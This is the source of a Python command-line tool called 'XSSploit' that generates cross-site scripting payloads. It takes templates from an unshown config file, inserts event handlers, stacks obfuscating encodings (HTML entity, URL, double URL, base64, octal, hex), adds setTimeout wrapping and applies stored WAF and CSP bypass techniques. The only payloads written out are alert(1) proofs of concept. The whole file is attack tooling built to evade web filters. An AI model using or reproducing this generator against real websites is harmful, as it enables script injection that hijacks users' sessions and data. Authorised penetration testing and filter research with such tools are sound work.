import argparse
import base64
import json
import random
import urllib.parse
import os

# Load the expanded configuration
config_path = os.path.join(os.path.dirname(__file__), 'config.json')
with open(config_path, 'r') as file:
    config = json.load(file)

# Encoding functions
def html_encode(payload):
    return ''.join(f"&#{ord(char)};" for char in payload)

def url_encode(payload):
    return urllib.parse.quote(payload)

def unicode_encode(payload):
    return ''.join(f"\\u{ord(char):04x}" for char in payload)

def base64_encode(payload):
    return base64.b64encode(payload.encode()).decode()

def double_url_encode(payload):
    return urllib.parse.quote(url_encode(payload))

def octal_encode(payload):
    return ''.join(f"\\{oct(ord(char))[2:]}" for char in payload)

def hex_encode(payload):
    return ''.join(f"\\x{ord(char):02x}" for char in payload)

# Encoding function dictionary
ENCODING_FUNCTIONS = {
    'html': html_encode,
    'url': url_encode,
    'unicode': unicode_encode,
    'base64': base64_encode,
    'double_url': double_url_encode,
    'octal': octal_encode,
    'hex': hex_encode
}

def encode_pipeline(payload, encodings):
    """Apply a sequence of encodings to the payload."""
    for encoding in encodings:
        if encoding in ENCODING_FUNCTIONS:
            payload = ENCODING_FUNCTIONS[encoding](payload)
        else:
            print(f"[!] Warning: Encoding '{encoding}' not recognized. Skipping.")
    return payload

def generate_payload(context, event, encodings=None, multistage=False):
    """Generates the XSS payload based on context, event, encoding, and multi-stage options."""
    base_payload = config["contexts"].get(context) or config["advanced_payloads"].get(context)
    
    if not base_payload:
        raise ValueError(f"[!] Invalid context: '{context}' not found in config.")
    
    if "{{event}}" in base_payload:
        base_payload = base_payload.replace("{{event}}", event)
    if "{{base64}}" in base_payload:
        base_payload = base_payload.replace("{{base64}}", base64_encode("alert(1)"))
    
    if encodings:
        base_payload = encode_pipeline(base_payload, encodings)
    
    if multistage:
        base_payload = f"setTimeout(`{base_payload}`,0)"
    
    return base_payload

def bypass_technique(name):
    """Retrieves bypass technique from config."""
    technique = config["bypass_techniques"].get(name)
    if not technique:
        raise ValueError(f"[!] Invalid bypass technique: '{name}' not found in config.")
    if "{{base64_script}}" in technique:
        base64_script = base64_encode("<script>alert(1)</script>")
        technique = technique.replace("{{base64_script}}", base64_script)
    return technique

def save_payload(payload, filename):
    """Save generated payload to a file."""
    with open(filename, "a") as file:
        file.write(payload + "\n")
    print(f"[+] Payload saved to {filename}")

def load_payload(filename):
    """Load payloads from a file."""
    with open(filename, "r") as file:
        payloads = file.readlines()
    return [payload.strip() for payload in payloads]

def interactive_mode():
    """Interactive mode for guided payload generation."""
    print("[*] Entering interactive mode.")
    
    # Choose context
    print("Available contexts:")
    for context in config["contexts"].keys():
        print(f" - {context}")
    chosen_context = input("Choose a context: ").strip()
    
    # Choose event
    print("Available events:")
    for event in config["events"]:
        print(f" - {event}")
    chosen_event = input("Choose an event (press Enter for random): ").strip() or random.choice(config["events"])
    
    # Choose encoding types
    print("Available encoding types:")
    for encoding in ENCODING_FUNCTIONS.keys():
        print(f" - {encoding}")
    chosen_encodings = input("Enter encoding types (comma-separated, e.g., 'base64,url'): ").strip().split(',')
    chosen_encodings = [enc.strip() for enc in chosen_encodings if enc.strip()]
    
    # Choose multistage option
    multistage = input("Do you want to use multistage payloads? (y/n): ").strip().lower() == 'y'
    
    # Generate the payload
    try:
        payload = generate_payload(chosen_context, chosen_event, chosen_encodings, multistage)
        print(f"\nGenerated Payload:\n{payload}")
    except ValueError as e:
        print(e)
    
    # Save payload option
    save_choice = input("Do you want to save the payload to a file? (y/n): ").strip().lower()
    if save_choice == 'y':
        filename = input("Enter the filename to save the payload: ").strip()
        save_payload(payload, filename)

def main():
    parser = argparse.ArgumentParser(description="XSSploit: Advanced XSS Payload Generator with Bypass Techniques")

    # Short flags for usability
    parser.add_argument('-c', '--context', type=str, help="Specify the HTML context or advanced payload.")
    parser.add_argument('-e', '--encode', type=str, help="Select encoding type for payload (e.g., html, url, unicode, base64).")
    parser.add_argument('-v', '--event', type=str, help="Specify an event handler for the payload. Default is random.")
    parser.add_argument('-w', '--waf', action='store_true', help="Generate WAF-bypassing payload.")
    parser.add_argument('-p', '--csp', action='store_true', help="Generate CSP-compliant payload.")
    parser.add_argument('-m', '--multistage', action='store_true', help="Generate multi-stage payloads.")
    parser.add_argument('-s', '--save', type=str, help="Save generated payloads to a file.")
    parser.add_argument('-l', '--load', type=str, help="Load payloads from a file.")
    parser.add_argument('-i', '--interactive', action='store_true', help="Run the tool in interactive mode.")

    args = parser.parse_args()

    # Run in interactive mode if specified
    if args.interactive:
        interactive_mode()
        return

    # Load and print payloads from file
    if args.load:
        loaded_payloads = load_payload(args.load)
        print(f"Loaded payloads from {args.load}:")
        for payload in loaded_payloads:
            print(payload)
        return

    # Choose bypass technique if specified
    try:
        if args.csp:
            payload = bypass_technique("csp")
        elif args.waf:
            payload = bypass_technique("waf")
        else:
            encodings = args.encode.split(',') if args.encode else None
            payload = generate_payload(args.context, args.event or random.choice(config["events"]), encodings, args.multistage)
        
        print(f"Generated Payload: {payload}")
        
        # Save payload if specified
        if args.save:
            save_payload(payload, args.save)
    
    except ValueError as e:
        print(e)

if __name__ == '__main__':
    main()
